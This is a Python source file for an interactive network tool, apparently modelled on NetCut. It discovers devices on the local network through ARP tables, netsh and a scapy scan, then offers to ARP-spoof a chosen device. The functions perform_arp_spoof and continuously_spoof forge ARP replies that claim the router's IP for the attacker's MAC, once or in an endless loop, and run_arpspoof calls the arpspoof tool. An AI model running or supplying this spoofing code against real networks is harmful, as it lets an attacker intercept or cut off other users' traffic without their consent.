import ipaddress
import logging
import os
import re
import socket
import subprocess
import time
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed

from scapy.all import ARP, Ether, send, sendp


class Colors:
    HEADER = "\033[95m"
    OKBLUE = "\033[94m"
    OKCYAN = "\033[96m"
    OKGREEN = "\033[92m"
    WARNING = "\033[93m"
    FAIL = "\033[91m"
    ENDC = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"


# Configure logging
DEBUG_LOGGING = os.getenv("NETCUT_DEBUG", "").lower() in {"1", "true", "yes", "on", "debug"}
LOG_LEVEL = logging.DEBUG if DEBUG_LOGGING else logging.INFO
logging.basicConfig(
    level=LOG_LEVEL,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger(__name__)


# Try to use scapy optionally when available
try:
    from scapy.all import ARP, Ether, srp
    SCAPY_AVAILABLE = True
except Exception:
    SCAPY_AVAILABLE = False

# Enable this for active ARP scanning with scapy (slightly slower)
USE_SCAPY_ACTIVE_SCAN = False  # Keep False for fastest execution

# MAC formatting helper
def normalize_mac(mac: str) -> str:
    """Return a colon-delimited lowercase MAC or an empty string if invalid."""
    if not mac:
        return ""

    mac = mac.lower().replace("-", ":")

    if re.fullmatch(r"[0-9a-f]{2}(?::[0-9a-f]{2}){5}", mac):
        return mac

    return ""


# --------- General utilities ---------
def run_arpspoof(target_ip, spoof_ip):
    """
    Use arpspoof tool to perform ARP spoofing.
    """
    try:
        subprocess.run(["arpspoof", "-i", "eth0", "-t", target_ip, spoof_ip], check=True)
        print(f"arpspoof running on {target_ip} -> {spoof_ip}")
    except subprocess.CalledProcessError as e:
        print(f"Failed to run arpspoof: {e}")
        

def is_router_ip(ip: str) -> bool:
    """
    تحقق مما إذا كان عنوان الـ IP يُعتبر راوتر شائعاً.
    """
    # قائمة بالعناوين الشائعة للراوتر
    common_router_ips = ["192.168.1.1", "192.168.0.1"]
    
    return ip in common_router_ips

        
def run_cmd(cmd):
    """Run a command and return stdout as text."""
    logger.debug("Running command: %s", cmd)
    result = subprocess.run(
        cmd,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="ignore",
        shell=False,
    )
    logger.debug("Command %s finished with return code %s", cmd, result.returncode)
    return result.stdout


def is_ip_online(ip: str) -> bool:
    """Ping IP once with small timeout. True if reachable."""
    try:
        # -n 1 = one echo, -w 500 = 500ms timeout
        result = subprocess.run(
            ["ping", "-n", "1", "-w", "500", ip],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        return result.returncode == 0
    except Exception:
        return False


def get_mac_from_arp_cache(ip: str) -> str:
    """
    Use 'arp -a' to find MAC for a specific IP. Retry if not found initially.
    """
    max_attempts = 3
    logger.debug("Looking up MAC for %s in ARP cache", ip)
    for attempt in range(max_attempts):
        output = run_cmd(["arp", "-a", ip])
        mac_pattern = re.compile(
            rf"{re.escape(ip)}\s+([0-9a-fA-F\-]+)\s+(dynamic|static|invalid)",
            re.IGNORECASE,
        )
        for line in output.splitlines():
            m = mac_pattern.search(line)
            if m:
                mac = normalize_mac(m.group(1))
                if mac and mac not in {"ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00"}:
                    logger.debug("Found MAC %s for %s on attempt %d", mac, ip, attempt + 1)
                    return mac
        time.sleep(1)  # Wait before retrying
    logger.debug("No MAC found for %s after %d attempts", ip, max_attempts)
    return ""



# --------- 1) Read ARP TABLE using arp -a ---------

def get_from_arp_cmd():
    """
    Read ARP table via 'arp -a'.
    Extract IP, MAC, ARP Type.
    """
    logger.info("Collecting entries from 'arp -a'")
    output = run_cmd(["arp", "-a"])
    lines = output.splitlines()

    entries = []
    current_interface = None

    pattern = re.compile(
        r"(\d+\.\d+\.\d+\.\d+)\s+([0-9a-fA-F\-]+)\s+(dynamic|static)",
        re.IGNORECASE,
    )

    for line in lines:
        line = line.strip()
        if not line:
            continue

        if line.lower().startswith("interface:"):
            current_interface = line
            continue

        m = pattern.match(line)
        if m:
            ip, mac, arp_type = m.groups()
            entries.append({
                "source": "arp",
                "interface": current_interface,
                "ip": ip,
                "mac": normalize_mac(mac),
                "arp_type": arp_type.lower(),
            })

    logger.info("Found %d ARP entries", len(entries))
    return entries


# --------- 2) netsh neighbors ---------

def get_from_netsh_neighbors():
    """
    Read ARP/ND cache via:
      netsh interface ip show neighbors
    Extract IP, MAC, State/Type.
    """
    logger.info("Collecting entries from 'netsh interface ip show neighbors'")
    output = run_cmd(["netsh", "interface", "ip", "show", "neighbors"])
    lines = output.splitlines()

    entries = []
    current_interface = None

    for line in lines:
        line = line.strip()
        if not line:
            continue

        if line.lower().startswith("interface"):
            current_interface = line
            continue

        if line.lower().startswith("internet address") or line.startswith("---"):
            continue

        parts = line.split()
        if len(parts) >= 3:
            ip = parts[0]
            mac = parts[1].lower()
            arp_type = parts[2].lower()  # dynamic / static / incomplete...

            if re.match(r"^\d+\.\d+\.\d+\.\d+$", ip):
                entries.append({
                    "source": "netsh",
                    "interface": current_interface,
                    "ip": ip,
                    "mac": normalize_mac(mac),
                    "arp_type": arp_type,
                })

    logger.info("Found %d netsh neighbor entries", len(entries))
    return entries


# --------- 3) Optional active ARP scan ---------

def get_local_network_cidr():
    """
    Guess local /24 network from current IP.
    Example: 192.168.1.12 -> 192.168.1.0/24
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
    except Exception:
        try:
            local_ip = socket.gethostbyname(socket.gethostname())
        except Exception:
            logger.debug("Unable to determine local IP for CIDR detection")
            return None

    try:
        net = ipaddress.ip_network(local_ip + "/24", strict=False)
        logger.debug("Detected local network CIDR: %s", net)
        return str(net)
    except Exception:
        logger.debug("Failed to parse network CIDR from local IP %s", local_ip)
        return None


def get_from_scapy_active_scan():
    """
    Optional ARP active scan using scapy.
    """
    if not (SCAPY_AVAILABLE and USE_SCAPY_ACTIVE_SCAN):
        logger.debug("Skipping scapy active scan (available=%s, enabled=%s)", SCAPY_AVAILABLE, USE_SCAPY_ACTIVE_SCAN)
        return []

    network = get_local_network_cidr()
    if not network:
        logger.info("No network CIDR detected; skipping scapy scan")
        return []

    try:
        arp = ARP(pdst=network)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp

        answered, _ = srp(packet, timeout=2, verbose=False)

        entries = []
        for _, received in answered:
            entries.append({
                "source": "scapy",
                "interface": None,
                "ip": received.psrc,
                "mac": received.hwsrc.lower(),
                "arp_type": "dynamic",
            })
        logger.info("Scapy scan discovered %d entries", len(entries))
        return entries
    except Exception:
        logger.exception("Scapy active scan failed")
        return []


# --------- ARP Spoofing utilities ---------

def get_own_mac():
    """Retrieve the MAC address of the current machine."""
    mac_num = hex(uuid.getnode()).replace("0x", "").zfill(12)
    return ":".join([mac_num[e:e+2] for e in range(0, 12, 2)])


def _get_mac_for_ip(target_ip, online_devices):
    """Return the MAC address for ``target_ip`` from either a dict or list of devices."""
    if isinstance(online_devices, dict):
        return normalize_mac(online_devices.get(target_ip, ""))

    for device in online_devices:
        if isinstance(device, dict) and device.get("ip") == target_ip:
            return normalize_mac(device.get("mac", ""))

    return ""


def perform_arp_spoof(target_ip, spoof_ip, online_devices, count=10):
    """
    Perform ARP spoofing using the MAC address from the pre-scanned online devices.

    Args:
        target_ip (str): IP address of the target device.
        spoof_ip (str): IP address of the router to spoof.
        online_devices (Iterable): Previously scanned devices containing IP and MAC addresses.
        count (int): Number of ARP packets to send.
    """
    target_mac = _get_mac_for_ip(target_ip, online_devices)

    if not target_mac:
        print(f"[Error] Could not find MAC for target {target_ip}. Make sure the device is online and scanned.")
        return

    our_mac = get_own_mac()
    logger.info("Starting ARP spoof: target_ip=%s, spoof_ip=%s, target_mac=%s, our_mac=%s", target_ip, spoof_ip, target_mac, our_mac)

    arp_response = ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
        hwsrc=our_mac
    )

    packet = Ether(dst=target_mac) / arp_response

    for _ in range(count):
        sendp(packet, verbose=False)
        time.sleep(1)  # Short delay between sends
    logger.info("Completed sending %d spoof packets to %s", count, target_ip)
    print(f"ARP Spoofing sent {count} times from {spoof_ip} to {target_ip} using our MAC as the router's MAC.")




def continuously_spoof(target_ip, spoof_ip, online_devices, interval=1):
    """
    Continuously send ARP spoofing packets every 'interval' seconds.

    Args:
        target_ip (str): IP address of the target device.
        spoof_ip (str): IP address of the router to spoof.
        online_devices (dict): A dictionary of previously scanned devices with IP and MAC addresses.
        interval (int): Time in seconds between each spoofing packet.
    """
    try:
        while True:
            perform_arp_spoof(target_ip, spoof_ip, online_devices)
            time.sleep(interval)
    except KeyboardInterrupt:
        print(f"{Colors.WARNING}\n[!] Stopping continuous ARP spoofing.{Colors.ENDC}")





# --------- 4) Merge results ---------

def merge_entries(*lists_of_entries):
    """
    Merge all results by IP.
    Keep first "good" MAC and ARP type.
    """
    logger.debug("Merging %d entry lists", len(lists_of_entries))
    merged = {}

    for entries in lists_of_entries:
        for e in entries:
            ip = e["ip"]
            if ip not in merged:
                merged[ip] = {
                    "ip": ip,
                    "mac": "",
                    "arp_type": "",
                    "interfaces": set(),
                    "sources": set(),
                }

            data = merged[ip]

            mac_new = normalize_mac(e.get("mac", ""))
            if mac_new and mac_new not in {"ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00"}:
                if not data["mac"]:
                    data["mac"] = mac_new

            arp_new = e.get("arp_type", "").lower()
            if arp_new and not data["arp_type"]:
                data["arp_type"] = arp_new

            if e.get("interface"):
                data["interfaces"].add(e["interface"])
            if e.get("source"):
                data["sources"].add(e["source"])

    for ip, data in merged.items():
        data["interfaces"] = ", ".join(sorted(data["interfaces"])) if data["interfaces"] else ""
        data["sources"] = ", ".join(sorted(data["sources"])) if data["sources"] else ""

    logger.info("Merged into %d unique IPs", len(merged))
    return merged


# --------- 5) Hostname + Device Type + Ping (Multithread) ---------

def resolve_hostname(ip: str) -> str:
    try:
        hostname, _, _ = socket.gethostbyaddr(ip)
        return hostname
    except Exception:
        return "Unknown"


def guess_device_type(ip: str, hostname: str) -> str:
    h = (hostname or "").lower()

    if ip.endswith(".1") or ip.endswith(".254"):
        return "Router / Gateway (guess)"

    phone_keywords = [
        "android", "iphone", "ipad", "samsung", "huawei", "xiaomi",
        "oneplus", "oppo", "vivo", "redmi", "galaxy", "phone"
    ]
    if any(k in h for k in phone_keywords):
        return "Phone / Tablet (guess)"

    pc_keywords = ["desktop", "laptop", "pc", "win", "workstation"]
    if any(k in h for k in pc_keywords):
        return "PC / Laptop (guess)"

    smart_keywords = ["tv", "chromecast", "roku", "firetv", "printer"]
    if any(k in h for k in smart_keywords):
        return "Smart Device (guess)"

    return "Unknown"


def enrich_hosts_parallel(merged):
    """
    For each IP:
      - ping → online / offline
      - resolve hostname
      - guess device type
      - if MAC missing → use get_mac_from_arp_cache(ip)
    All using threads for speed.
    """
    ips = list(merged.keys())
    info = {}

    def task(ip):
        online = is_ip_online(ip)

        # Resolving hostnames while offline is still possible but slower
        hostname = resolve_hostname(ip)
        dev_type = guess_device_type(ip, hostname)

        mac = merged[ip]["mac"]
        if not mac:
            mac = get_mac_from_arp_cache(ip)

        return ip, online, hostname, dev_type, mac

    if not ips:
        logger.info("No IPs to enrich")
        return info

    max_workers = min(32, len(ips))
    logger.debug("Enriching %d IPs using %d worker threads", len(ips), max_workers)
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_ip = {executor.submit(task, ip): ip for ip in ips}
        for future in as_completed(future_to_ip):
            ip, online, hostname, dev_type, mac = future.result()
            info[ip] = {
                "online": online,
                "hostname": hostname,
                "device_type": dev_type,
                "mac": mac or "Unknown",
            }

    logger.info("Finished enriching %d hosts", len(info))
    return info


def print_device_table(title, devices, title_color=Colors.OKGREEN):
    print(f"{title_color}{title}{Colors.ENDC}\n")
    if not devices:
        print("No devices found.\n")
        return

    print(
        f"{'IP':<16} {'MAC':<20} {'ARP Type':<10} "
        f"{'Device Name':<35} {'Device Type':<25} {'Sources'}"
    )
    print("-" * 130)
    for device in devices:
        print(
            f"{device['ip']:<16} {device['mac']:<20} {device['arp_type']:<10} "
            f"{device['hostname']:<35} {device['device_type']:<25} {device['sources']}"
        )
    print()


def scan_network():
    print(f"{Colors.HEADER}Scanning network (grouping ONLINE and OFFLINE devices)...{Colors.ENDC}\n")

    logger.info("Starting network scan")

    online_devices = []
    offline_devices = []

    arp_entries = get_from_arp_cmd()
    netsh_entries = get_from_netsh_neighbors()
    scapy_entries = get_from_scapy_active_scan()

    merged = merge_entries(arp_entries, netsh_entries, scapy_entries)
    all_ips = sorted(merged.keys(), key=lambda ip: list(map(int, ip.split(".")))) if merged else []
    logger.debug("Sorted %d IPs for enrichment", len(all_ips))
    hostinfo = enrich_hosts_parallel(merged)

    for ip in all_ips:
        base = merged[ip]
        extra = hostinfo.get(ip, {})
        device = {
            "ip": ip,
            "mac": extra.get("mac", base["mac"] or "Unknown"),
            "arp_type": base["arp_type"] or "unknown",
            "hostname": extra.get("hostname", "Unknown"),
            "device_type": extra.get("device_type", "Unknown"),
            "sources": base["sources"],
        }
        if extra.get("online", False):
            online_devices.append(device)
        else:
            offline_devices.append(device)

    print_device_table("=== ONLINE DEVICES ===", online_devices, title_color=Colors.OKGREEN)
    print_device_table("=== OFFLINE / CACHED DEVICES ===", offline_devices, title_color=Colors.WARNING)

    logger.info("Network scan complete: %d online, %d offline", len(online_devices), len(offline_devices))

    return online_devices, offline_devices




def prompt_for_spoof(online_devices):
    """Interactively choose a target and perform one-off or continuous spoofing."""
    if not online_devices:
        print(f"{Colors.WARNING}No online devices available for spoofing. Run a scan first.{Colors.ENDC}\n")
        return

    print(f"{Colors.OKBLUE}Select a target for ARP spoofing:{Colors.ENDC}")
    for idx, device in enumerate(online_devices, start=1):
        print(
            f"{Colors.OKCYAN}{idx}. IP: {device['ip']}, MAC: {device['mac']}, "
            f"Device: {device['device_type']}, Name: {device['hostname']}{Colors.ENDC}"
        )

    try:
        target_idx = int(input("Enter the device number: "))
    except ValueError:
        print(f"{Colors.FAIL}Invalid selection. Please enter a number.{Colors.ENDC}\n")
        return

    if not 1 <= target_idx <= len(online_devices):
        print(f"{Colors.FAIL}Selection out of range.{Colors.ENDC}\n")
        return

    target_device = online_devices[target_idx - 1]
    target_ip = target_device["ip"]
    router_ip = input("Enter router IP to spoof (default 192.168.1.1): ").strip() or "192.168.1.1"

    mode = input("Continuous spoof? (y/n): ").strip().lower()

    if mode == "y":
        print(f"{Colors.WARNING}Starting continuous spoofing... Press CTRL+C to stop.{Colors.ENDC}")
        continuously_spoof(target_ip, router_ip, online_devices)
    else:
        perform_arp_spoof(target_ip, router_ip, online_devices)



def print_menu():
    print(f"{Colors.BOLD}{Colors.OKBLUE}\n=== Network Utility Menu ==={Colors.ENDC}")
    print(f"{Colors.OKGREEN}1.{Colors.ENDC} Scan network")
    print(f"{Colors.OKGREEN}2.{Colors.ENDC} Perform ARP spoofing (requires prior scan)")
    print(f"{Colors.OKGREEN}3.{Colors.ENDC} Exit")


def main():
    logger.info("NETCUT_DEBUG=%s", DEBUG_LOGGING)
    online_devices = []
    offline_devices = []

    while True:
        print_menu()
        choice = input("Select an option: ").strip()

        if choice == "1":
            online_devices, offline_devices = scan_network()
        elif choice == "2":
            prompt_for_spoof(online_devices)
        elif choice == "3":
            print(f"{Colors.OKCYAN}Goodbye!{Colors.ENDC}")
            break
        else:
            print(f"{Colors.FAIL}Invalid selection. Please choose 1, 2, or 3.{Colors.ENDC}\n")


if __name__ == "__main__":
    main()
